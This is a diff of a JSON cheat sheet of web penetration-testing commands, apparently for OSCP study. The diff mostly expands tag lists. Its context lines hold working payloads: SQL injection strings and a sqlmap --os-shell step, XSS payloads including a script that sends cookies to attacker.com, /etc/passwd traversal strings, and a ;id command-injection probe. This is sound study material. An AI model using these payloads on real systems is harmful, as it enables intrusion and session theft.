@@ -8,7 +8,17 @@
       "category": "web",
       "command": "gobuster dir -u <URL> -w <WORDLIST> -x php,asp,aspx,html,txt -t <THREADS>",
       "description": "Discover hidden directories and files",
-      "tags": ["WEB", "ENUM", "NOISY", "OSCP:HIGH", "QUICK_WIN"],
+      "tags": [
+        "DIRECTORY_ENUMERATION",
+        "DISCOVERY",
+        "ENUM",
+        "ENUMERATION",
+        "GOBUSTER",
+        "NOISY",
+        "OSCP:HIGH",
+        "QUICK_WIN",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -54,7 +64,11 @@
         "Try authenticated scan if 401/403: gobuster dir -u <URL> -w <WORDLIST> -c 'Cookie: session=<SESSION_TOKEN>'",
         "Check for backup files: gobuster dir -u <URL> -w <WORDLIST> -x bak,old,~"
       ],
-      "alternatives": ["dirb <URL>", "ffuf -u <URL>/FUZZ -w <WORDLIST>", "wfuzz -u <URL>/FUZZ -w <WORDLIST>"],
+      "alternatives": [
+        "dirb <URL>",
+        "ffuf -u <URL>/FUZZ -w <WORDLIST>",
+        "wfuzz -u <URL>/FUZZ -w <WORDLIST>"
+      ],
       "notes": "Adjust extensions based on technology stack",
       "oscp_relevance": "high"
     },
@@ -64,7 +78,15 @@
       "category": "web",
       "command": "nikto -h <URL> -output <OUTPUT>",
       "description": "Web vulnerability scanner",
-      "tags": ["WEB", "VULN", "NOISY", "AUTOMATED", "OSCP:MEDIUM"],
+      "tags": [
+        "AUTOMATED",
+        "ENUMERATION",
+        "NIKTO",
+        "NOISY",
+        "OSCP:MEDIUM",
+        "VULN",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -101,7 +123,11 @@
         "Test specific vulnerabilities found",
         "Check server version for exploits: searchsploit <server> <version>"
       ],
-      "alternatives": ["whatweb -v <URL>", "wapiti -u <URL>", "nuclei -u <URL>"],
+      "alternatives": [
+        "whatweb -v <URL>",
+        "wapiti -u <URL>",
+        "nuclei -u <URL>"
+      ],
       "notes": "Can be slow but thorough",
       "oscp_relevance": "medium"
     },
@@ -111,7 +137,19 @@
       "category": "web",
       "command": "sqlmap -u '<URL>?<PARAM>=<VALUE>' --batch --banner",
       "description": "Automated SQL injection testing",
-      "tags": ["SQLI", "WEB", "NOISY", "AUTOMATED", "OSCP:HIGH"],
+      "tags": [
+        "AUTOMATED",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "INJECTION",
+        "NOISY",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQLMAP",
+        "SQL_INJECTION",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -156,7 +194,11 @@
         "Get shell: sqlmap -u '<URL>' --os-shell",
         "Try different techniques: sqlmap -u '<URL>' --technique=U"
       ],
-      "alternatives": ["sqlmap -r request.txt --batch", "manual SQLi testing", "burp suite scanner"],
+      "alternatives": [
+        "sqlmap -r request.txt --batch",
+        "manual SQLi testing",
+        "burp suite scanner"
+      ],
       "notes": "Save Burp request to file for complex requests",
       "oscp_relevance": "high"
     },
@@ -166,7 +208,17 @@
       "category": "web",
       "command": "' OR 1=1--",
       "description": "Basic SQL injection payload",
-      "tags": ["SQLI", "WEB", "MANUAL", "QUICK_WIN", "OSCP:HIGH"],
+      "tags": [
+        "DATABASE",
+        "EXPLOITATION",
+        "INJECTION",
+        "MANUAL",
+        "OSCP:HIGH",
+        "QUICK_WIN",
+        "SQLI",
+        "SQL_INJECTION",
+        "WEB"
+      ],
       "variables": [],
       "flag_explanations": {
         "'": "SQL string delimiter to break out of query",
@@ -190,7 +242,13 @@
         "Enumerate tables: ' UNION SELECT table_name,null FROM information_schema.tables--",
         "Use sqlmap for automation: sqlmap -u '<URL>?param=value'"
       ],
-      "alternatives": ["' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1#", "admin'--", "' OR 1=1 LIMIT 1--"],
+      "alternatives": [
+        "' OR '1'='1",
+        "\" OR \"1\"=\"1",
+        "' OR 1=1#",
+        "admin'--",
+        "' OR 1=1 LIMIT 1--"
+      ],
       "notes": "Try with both single and double quotes",
       "oscp_relevance": "high"
     },
@@ -200,7 +258,16 @@
       "category": "web",
       "command": "wfuzz -c -z file,<WORDLIST> --hc 404 '<URL>?FUZZ=test'",
       "description": "Discover hidden parameters",
-      "tags": ["WEB", "FUZZ", "ENUM", "OSCP:MEDIUM"],
+      "tags": [
+        "DIRECTORY_ENUMERATION",
+        "DISCOVERY",
+        "ENUM",
+        "ENUMERATION",
+        "FUZZ",
+        "OSCP:MEDIUM",
+        "WEB",
+        "WFUZZ"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -238,7 +305,11 @@
         "Check for IDOR: <URL>?<PARAM>=1,2,3...",
         "Test for command injection: <URL>?<PARAM>=;id"
       ],
-      "alternatives": ["ffuf -u '<URL>?FUZZ=test' -w <WORDLIST>", "burp intruder", "param-miner"],
+      "alternatives": [
+        "ffuf -u '<URL>?FUZZ=test' -w <WORDLIST>",
+        "burp intruder",
+        "param-miner"
+      ],
       "notes": "Filter by response size or status code",
       "oscp_relevance": "medium"
     },
@@ -248,7 +319,14 @@
       "category": "web",
       "command": "<script>alert(1)</script>",
       "description": "Basic XSS payload",
-      "tags": ["XSS", "WEB", "MANUAL", "OSCP:MEDIUM"],
+      "tags": [
+        "CROSS_SITE_SCRIPTING",
+        "EXPLOITATION",
+        "MANUAL",
+        "OSCP:MEDIUM",
+        "WEB",
+        "XSS"
+      ],
       "variables": [],
       "flag_explanations": {
         "<script>": "HTML script tag for JavaScript execution",
@@ -272,7 +350,12 @@
         "Steal cookies: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
         "Check stored XSS in forms/comments"
       ],
-      "alternatives": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "\"><script>alert(1)</script>", "<body onload=alert(1)>"],
+      "alternatives": [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "\"><script>alert(1)</script>",
+        "<body onload=alert(1)>"
+      ],
       "notes": "Check if input is reflected in response",
       "oscp_relevance": "medium"
     },
@@ -282,7 +365,14 @@
       "category": "web",
       "command": "../../../../../../etc/passwd",
       "description": "Local file inclusion test",
-      "tags": ["LFI", "WEB", "MANUAL", "OSCP:HIGH"],
+      "tags": [
+        "DIRECTORY_TRAVERSAL",
+        "FILE_INCLUSION",
+        "LFI",
+        "MANUAL",
+        "OSCP:HIGH",
+        "WEB"
+      ],
       "variables": [],
       "flag_explanations": {
         "../": "Directory traversal to move up directories",
@@ -305,7 +395,12 @@
         "Windows LFI: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
         "PHP filter wrapper: php://filter/convert.base64-encode/resource=index.php"
       ],
-      "alternatives": ["....//....//etc/passwd", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "%252e%252e%252f", "file:///etc/passwd"],
+      "alternatives": [
+        "....//....//etc/passwd",
+        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "%252e%252e%252f",
+        "file:///etc/passwd"
+      ],
       "notes": "Try with null byte (%00) termination",
       "oscp_relevance": "high"
     },
@@ -315,7 +410,12 @@
       "category": "web",
       "command": "curl -X POST -d '<PARAM>=<VALUE>' <URL>",
       "description": "Send POST request with data",
-      "tags": ["WEB", "MANUAL", "HTTP"],
+      "tags": [
+        "CURL",
+        "HTTP",
+        "MANUAL",
+        "WEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -358,7 +458,11 @@
         "Use cookies: curl -b cookies.txt <URL>",
         "Follow redirects: curl -L -X POST -d 'data' <URL>"
       ],
-      "alternatives": ["wget --post-data '<PARAM>=<VALUE>' <URL>", "httpie POST <URL> param=value", "python requests.post()"],
+      "alternatives": [
+        "wget --post-data '<PARAM>=<VALUE>' <URL>",
+        "httpie POST <URL> param=value",
+        "python requests.post()"
+      ],
       "notes": "Use -H for custom headers",
       "oscp_relevance": "medium"
     },
@@ -368,7 +472,14 @@
       "category": "web",
       "command": "whatweb -v <URL>",
       "description": "Identify web technologies",
-      "tags": ["WEB", "ENUM", "FAST", "OSCP:HIGH"],
+      "tags": [
+        "ENUM",
+        "ENUMERATION",
+        "FAST",
+        "OSCP:HIGH",
+        "WEB",
+        "WHATWEB"
+      ],
       "variables": [
         {
           "name": "<URL>",
@@ -397,7 +508,11 @@
         "Look for technology-specific vulnerabilities",
         "Adjust wordlists based on technology (PHP, ASP, JSP)"
       ],
-      "alternatives": ["wappalyzer browser extension", "builtwith.com", "curl -I <URL>"],
+      "alternatives": [
+        "wappalyzer browser extension",
+        "builtwith.com",
+        "curl -I <URL>"
+      ],
       "notes": "Essential for finding version-specific exploits",
       "oscp_relevance": "high"
     }
